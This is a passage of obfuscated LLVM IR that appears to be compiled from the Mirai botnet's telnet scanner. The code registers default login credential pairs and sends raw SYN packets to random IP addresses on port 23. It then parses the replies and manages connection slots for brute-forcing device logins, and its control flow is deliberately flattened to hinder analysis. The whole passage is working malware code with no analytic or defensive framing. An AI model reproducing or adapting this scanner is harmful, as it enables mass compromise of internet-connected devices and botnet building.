  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i16 zeroext 1)
  store i32 -2064983491, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %157 = load i32, i32* @fake_time, align 4
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %157, %158
  %160 = select i1 %159, i32 2031223812, i32 679566374
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i32, i32* @fake_time, align 4
  store i32 %162, i32* %13, align 4
  store i32 0, i32* %1, align 4
  store i32 1012011799, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i32, i32* %1, align 4
  %165 = icmp slt i32 %164, 760
  %166 = select i1 %165, i32 -357796149, i32 -179289142
  store i32 %166, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.tcphdr*
  store %struct.tcphdr* %171, %struct.tcphdr** %19, align 8
  %172 = call i32 @rand_next()
  %173 = trunc i32 %172 to i16
  %174 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i32, i32* @LOCAL_ADDR, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 8
  store i32 %176, i32* %178, align 4
  %179 = call i32 @get_random_ip()
  %180 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 7
  store i16 0, i16* %183, align 2
  %184 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %185 = bitcast %struct.iphdr* %184 to i16*
  %186 = call zeroext i16 @checksum_generic(i16* %185, i32 20)
  %187 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 7
  store i16 %186, i16* %188, align 2
  %189 = call zeroext i16 @htons(i16 zeroext 23) #9
  %190 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 1
  store i16 %189, i16* %191, align 2
  %192 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  %194 = load i32, i32* %193, align 4
  %195 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 2
  store i32 %194, i32* %196, align 4
  %197 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %198 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %197, i32 0, i32 6
  store i16 0, i16* %198, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %200 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %201 = bitcast %struct.tcphdr* %200 to i8*
  %202 = call zeroext i16 @htons(i16 zeroext 20) #9
  %203 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %199, i8* %201, i16 zeroext %202, i32 20)
  %204 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 6
  store i16 %203, i16* %205, align 4
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %206, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  %209 = load i32, i32* %208, align 4
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %211 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %210, i32 0, i32 0
  store i32 %209, i32* %211, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  %214 = load i16, i16* %213, align 2
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %214, i16* %215, align 2
  %216 = load i32, i32* @rsck, align 4
  %217 = bitcast %union.__SOCKADDR_ARG* %20 to %struct.sockaddr**
  %218 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %218, %struct.sockaddr** %217, align 8
  %219 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %20, i32 0, i32 0
  %220 = load %struct.sockaddr*, %struct.sockaddr** %219, align 8
  %221 = call i64 @sendto(i32 %216, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %220, i32 16)
  store i32 -1506013524, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i32, i32* %1, align 4
  %224 = add nsw i32 %223, 1
  store i32 %224, i32* %1, align 4
  store i32 1012011799, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  store i32 679566374, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %229 = bitcast i8* %228 to %struct.iphdr*
  store %struct.iphdr* %229, %struct.iphdr** %23, align 8
  %230 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i64 1
  %232 = bitcast %struct.iphdr* %231 to %struct.tcphdr*
  store %struct.tcphdr* %232, %struct.tcphdr** %24, align 8
  %233 = call i32* @__errno_location() #9
  store i32 0, i32* %233, align 4
  %234 = load i32, i32* @rsck, align 4
  %235 = getelementptr inbounds [1514 x i8], [1514 x i8]* %22, i32 0, i32 0
  %236 = bitcast %union.__SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %236, align 8
  %237 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %26, i32 0, i32 0
  %238 = load %struct.sockaddr*, %struct.sockaddr** %237, align 8
  %239 = call i64 @recvfrom(i32 %234, i8* %235, i64 1514, i32 16384, %struct.sockaddr* %238, i32* null)
  %240 = trunc i64 %239 to i32
  store i32 %240, i32* %21, align 4
  %241 = load i32, i32* %21, align 4
  %242 = icmp sle i32 %241, 0
  %243 = select i1 %242, i32 -75795345, i32 1886110287
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32* @__errno_location() #9
  %246 = load i32, i32* %245, align 4
  %247 = icmp eq i32 %246, 11
  %248 = select i1 %247, i32 -75795345, i32 513604896
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32* @__errno_location() #9
  %251 = load i32, i32* %250, align 4
  %252 = icmp eq i32 %251, 11
  %253 = select i1 %252, i32 -75795345, i32 -1348396509
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 806583791, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i32, i32* %21, align 4
  %257 = sext i32 %256 to i64
  %258 = icmp ult i64 %257, 40
  %259 = select i1 %258, i32 -1698749159, i32 -270320920
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 9
  %264 = load i32, i32* %263, align 4
  %265 = load i32, i32* @LOCAL_ADDR, align 4
  %266 = icmp ne i32 %264, %265
  %267 = select i1 %266, i32 1571349832, i32 -127928694
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 6
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp ne i32 %273, 6
  %275 = select i1 %274, i32 198906088, i32 1237668938
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = load i16, i16* %279, align 4
  %281 = zext i16 %280 to i32
  %282 = call zeroext i16 @htons(i16 zeroext 23) #9
  %283 = zext i16 %282 to i32
  %284 = icmp ne i32 %281, %283
  %285 = select i1 %284, i32 1791861386, i32 489329402
  store i32 %285, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 1
  %290 = load i16, i16* %289, align 2
  %291 = zext i16 %290 to i32
  %292 = load i16, i16* %2, align 2
  %293 = zext i16 %292 to i32
  %294 = icmp ne i32 %291, %293
  %295 = select i1 %294, i32 672012007, i32 1487371736
  store i32 %295, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 4
  %300 = load i16, i16* %299, align 4
  %301 = lshr i16 %300, 9
  %302 = and i16 %301, 1
  %303 = icmp ne i16 %302, 0
  %304 = select i1 %303, i32 554887450, i32 -1438663107
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 4
  %309 = load i16, i16* %308, align 4
  %310 = lshr i16 %309, 12
  %311 = and i16 %310, 1
  %312 = icmp ne i16 %311, 0
  %313 = select i1 %312, i32 -1710323713, i32 291708042
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 10
  %320 = and i16 %319, 1
  %321 = icmp ne i16 %320, 0
  %322 = select i1 %321, i32 416422450, i32 -1476822921
  store i32 %322, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = lshr i16 %327, 8
  %329 = and i16 %328, 1
  %330 = icmp ne i16 %329, 0
  %331 = select i1 %330, i32 278959206, i32 -1974601951
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %335 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %334, i32 0, i32 3
  %336 = load i32, i32* %335, align 4
  %337 = call i32 @ntohl(i32 %336) #9
  %338 = sub i32 %337, 1
  %339 = call i32 @htonl(i32 %338) #9
  %340 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = icmp ne i32 %339, %342
  %344 = select i1 %343, i32 -2044615089, i32 -589726594
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store %struct.scanner_connection* null, %struct.scanner_connection** %25, align 8
  %347 = load i32, i32* %12, align 4
  store i32 %347, i32* %21, align 4
  store i32 20536455, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %21, align 4
  %350 = icmp slt i32 %349, 628
  %351 = select i1 %350, i32 1388061037, i32 -276754164
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %354 = load i32, i32* %21, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %353, i64 %355
  %357 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %356, i32 0, i32 16
  %358 = load i32, i32* %357, align 8
  %359 = icmp eq i32 %358, 0
  %360 = select i1 %359, i32 -604737738, i32 -1662490383
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %363 = load i32, i32* %21, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %362, i64 %364
  store %struct.scanner_connection* %365, %struct.scanner_connection** %25, align 8
  %366 = load i32, i32* %21, align 4
  store i32 %366, i32* %12, align 4
  store i32 -276754164, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  store i32 -2062517049, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i32, i32* %21, align 4
  %370 = add nsw i32 %369, 1
  store i32 %370, i32* %21, align 4
  store i32 20536455, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %373 = icmp eq %struct.scanner_connection* %372, null
  %374 = select i1 %373, i32 -2104600, i32 -131027867
  store i32 %374, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  store i32 806583791, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 8
  %379 = load i32, i32* %378, align 4
  %380 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %381 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %380, i32 0, i32 15
  store i32 %379, i32* %381, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %24, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = load i16, i16* %383, align 4
  %385 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  %386 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %385, i32 0, i32 13
  store i16 %384, i16* %386, align 8
  %387 = load %struct.scanner_connection*, %struct.scanner_connection** %25, align 8
  call void @setup_connection(%struct.scanner_connection* %387)
  store i32 -1765936708, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  store i32 1217204083, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %391 = getelementptr inbounds [16 x i64], [16 x i64]* %390, i64 0, i64 0
  %392 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %391) #7, !srcloc !3
  %393 = extractvalue { i64, i64* } %392, 0
  %394 = extractvalue { i64, i64* } %392, 1
  %395 = trunc i64 %393 to i32
  store i32 %395, i32* %27, align 4
  %396 = ptrtoint i64* %394 to i64
  %397 = trunc i64 %396 to i32
  store i32 %397, i32* %28, align 4
  store i32 -1906116670, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  store i32 -859293449, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i32 0, i32 0
  %401 = getelementptr inbounds [16 x i64], [16 x i64]* %400, i64 0, i64 0
  %402 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %401) #7, !srcloc !4
  %403 = extractvalue { i64, i64* } %402, 0
  %404 = extractvalue { i64, i64* } %402, 1
  %405 = trunc i64 %403 to i32
  store i32 %405, i32* %29, align 4
  %406 = ptrtoint i64* %404 to i64
  %407 = trunc i64 %406 to i32
  store i32 %407, i32* %30, align 4
  store i32 1360839022, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1797688084, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i32, i32* %1, align 4
  %411 = icmp slt i32 %410, 628
  %412 = select i1 %411, i32 -553774674, i32 -991593468
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %415 = load i32, i32* %1, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %414, i64 %416
  store %struct.scanner_connection* %417, %struct.scanner_connection** %10, align 8
  %418 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %419 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %418, i32 0, i32 16
  %420 = load i32, i32* %419, align 8
  %421 = icmp ugt i32 %420, 1
  %422 = select i1 %421, i32 30, i32 5
  store i32 %422, i32* %31, align 4
  %423 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %424 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %423, i32 0, i32 16
  %425 = load i32, i32* %424, align 8
  %426 = icmp ne i32 %425, 0
  %427 = select i1 %426, i32 -584212970, i32 -502091974
  store i32 %427, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = load i32, i32* @fake_time, align 4
  %430 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %431 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %430, i32 0, i32 3
  %432 = load i32, i32* %431, align 4
  %433 = sub i32 %429, %432
  %434 = load i32, i32* %31, align 4
  %435 = icmp ugt i32 %433, %434
  %436 = select i1 %435, i32 942481700, i32 -502091974
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %439 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %438, i32 0, i32 2
  %440 = load i32, i32* %439, align 8
  %441 = icmp eq i32 %440, -1
  %442 = select i1 %441, i32 807589548, i32 -1059023731
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  store i32 -1198779449, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %446 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %445, i32 0, i32 2
  %447 = load i32, i32* %446, align 8
  %448 = call i32 @close(i32 %447)
  %449 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %450 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %449, i32 0, i32 2
  store i32 -1, i32* %450, align 8
  %451 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %452 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %451, i32 0, i32 16
